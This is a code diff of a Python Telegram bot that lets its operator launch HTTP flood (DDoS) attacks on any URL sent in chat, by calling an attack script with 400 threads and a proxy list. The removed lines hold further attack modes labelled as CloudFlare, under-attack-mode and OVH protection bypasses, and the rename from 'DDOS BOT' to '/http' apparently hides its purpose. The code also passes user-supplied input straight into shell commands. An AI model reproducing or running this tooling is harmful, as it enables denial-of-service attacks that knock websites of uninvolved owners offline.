@@ -1,6 +1,5 @@
 import requests
 import telegram
-#from telegram import Update
 from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
 from telegram.update import Update
 import re 
@@ -8,16 +7,13 @@ import os
 import subprocess
 import concurrent.futures
 
-
-#Telegram token
-token = os.getenv('TELEGRAM_TOKEN')
+token = os.getenv('TOKEN')
 bot_number = os.getenv('NUM')
 updater = Updater(token,use_context=True)
 s = 400000000
 
-
 def start(update: Update, context: CallbackContext):
-  update.message.reply_text(f"DDOS BOT {bot_number}")
+  update.message.reply_text(f"/http (url) {bot_number}")
   
   
 def tmps(update: Update, context: CallbackContext):
@@ -25,62 +21,25 @@ def tmps(update: Update, context: CallbackContext):
   s = update.message.text.replace('/t', '')
   update.message.reply_text(f"Attaking Time {s} s")
   
- 
-
   
-def ddos_start(url):
-  subprocess.call(f'python3 ~/hulkserver/start.py GET {url} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-
-def ddos(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/ddos', '')
-  update.message.reply_text(f"METHOD: GET L7 THREADS : 400 pour: {s} s")
-  with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
-    futures = []
-    for _ in url:
-      futures.append(executor.submit(ddos_start, url))
-      chat_id = str(update.effective_user.id)
-
-
-
-
-def google_bot(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/bot', '')
-  update.message.reply_text(f"METHOD: BOT L7 THREADS : 400\n\nBOT: Like Google bot Time: {s} s")
-  url_str = str(url)
-  print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py BOT {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-  output, error = p.communicate()
-  if error:
-    update.message.reply_text(f'Erreur : {error.decode()}')
-  else:
-     # Divise l'output en plusieurs parties
-    parts = output.decode().split('\n')
-    
-    # Envoie chaque partie de l'output au chat
-    for part in parts:
-      chat_id = str(update.effective_user.id)
-      update.message.bot.send_message(
-        chat_id = chat_id,
-        text=part,
-        disable_web_page_preview=True,
-        parse_mode='HTML'
-      )       
+def speed_start(url):
+  subprocess.call(f'python3 ~/speed/start.py GET {url} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
 
       
 def STRESS(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/stress', '')
-  update.message.reply_text(f"METHOD: STRESS L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte Time: {s} s")
+  url = update.message.text.replace('/http', '')
+  update.message.reply_text(f"METHOD: HTTP L7 THREADS : 400\n\nSTRESS: Send HTTP Packet With High Byte Time: {s} s")
   url_str = str(url)
   print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
+  p = subprocess.Popen(f'python3 ~/speed/start.py STRESS {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
   output, error = p.communicate()
   if error:
     update.message.reply_text(f'Erreur : {error.decode()}')
   else:
-     # Divise l'output en plusieurs parties
+     
     parts = output.decode().split('\n')
     
-    # Envoie chaque partie de l'output au chat
+    
     for part in parts:
       chat_id = str(update.effective_user.id)
       update.message.bot.send_message(
@@ -89,112 +48,11 @@ def STRESS(update: Update, context: CallbackContext):
         disable_web_page_preview=True,
         parse_mode='HTML'
       )
-      
-def CFB(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/CFB', '')
-  update.message.reply_text(f"METHOD: CFB L7 THREADS : 400\n\nCFB: CloudFlare Bypass Time: {s} s")
-  url_str = str(url)
-  print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py CFB {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-  output, error = p.communicate()
-  if error:
-    update.message.reply_text(f'Erreur : {error.decode()}')
-  else:
-     # Divise l'output en plusieurs parties
-    parts = output.decode().split('\n')
-    
-    # Envoie chaque partie de l'output au chat
-    for part in parts:
-      chat_id = str(update.effective_user.id)
-      update.message.bot.send_message(
-        chat_id = chat_id,
-        text=part,
-        disable_web_page_preview=True,
-        parse_mode='HTML'
-      )  
-      
-def CFBUAM(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/CFBUAM', '')
-  update.message.reply_text(f"METHOD: CFBUAM L7 THREADS : 400\n\nCFBUAM: CloudFlare Under Attack Mode Bypass Time: {s} s")
-  url_str = str(url)
-  print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py CFBUAM {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-  output, error = p.communicate()
-  if error:
-    update.message.reply_text(f'Erreur : {error.decode()}')
-  else:
-     # Divise l'output en plusieurs parties
-    parts = output.decode().split('\n')
-    
-    # Envoie chaque partie de l'output au chat
-    for part in parts:
-      chat_id = str(update.effective_user.id)
-      update.message.bot.send_message(
-        chat_id = chat_id,
-        text=part,
-        disable_web_page_preview=True,
-        parse_mode='HTML'
-      )    
-      
-def TOR(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/tor', '')
-  update.message.reply_text(f"METHOD: CFB L7 THREADS : 400\n\nTOR: Bypass onion website Time: {s} s")
-  url_str = str(url)
-  print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py TOR {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-  output, error = p.communicate()
-  if error:
-    update.message.reply_text(f'Erreur : {error.decode()}')
-  else:
-     # Divise l'output en plusieurs parties
-    parts = output.decode().split('\n')
-    
-    # Envoie chaque partie de l'output au chat
-    for part in parts:
-      chat_id = str(update.effective_user.id)
-      update.message.bot.send_message(
-        chat_id = chat_id,
-        text=part,
-        disable_web_page_preview=True,
-        parse_mode='HTML'
-      )        
-      
-def OVH(update: Update, context: CallbackContext):
-  url = update.message.text.replace('/ovh', '')
-  update.message.reply_text(f"METHOD: OVH L7 THREADS : 400\n\nOVH: Bypass OVH Time: {s} s")
-  url_str = str(url)
-  print(url_str)
-  p = subprocess.Popen(f'python3 ~/hulkserver/start.py OVH {url_str} 1 400 p/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
-  output, error = p.communicate()
-  if error:
-    update.message.reply_text(f'Erreur : {error.decode()}')
-  else:
-     # Divise l'output en plusieurs parties
-    parts = output.decode().split('\n')
-    
-    # Envoie chaque partie de l'output au chat
-    for part in parts:
-      chat_id = str(update.effective_user.id)
-      update.message.bot.send_message(
-        chat_id = chat_id,
-        text=part,
-        disable_web_page_preview=True,
-        parse_mode='HTML'
-      )        
             
-      
-      
-
-#Trigger des fonctions
 updater.dispatcher.add_handler(CommandHandler('t', tmps))
 
-updater.dispatcher.add_handler(CommandHandler('ddos', ddos))
+
 updater.dispatcher.add_handler(CommandHandler('start', start))
-updater.dispatcher.add_handler(CommandHandler('bot', google_bot))
-updater.dispatcher.add_handler(CommandHandler('stress', STRESS))
-updater.dispatcher.add_handler(CommandHandler('cfb', CFB))
-updater.dispatcher.add_handler(CommandHandler('cfbuam', CFBUAM))
-updater.dispatcher.add_handler(CommandHandler('tor', TOR))
-updater.dispatcher.add_handler(CommandHandler('ovh', OVH))
-#Run the bot
+updater.dispatcher.add_handler(CommandHandler('http', STRESS))
+
 updater.start_polling()
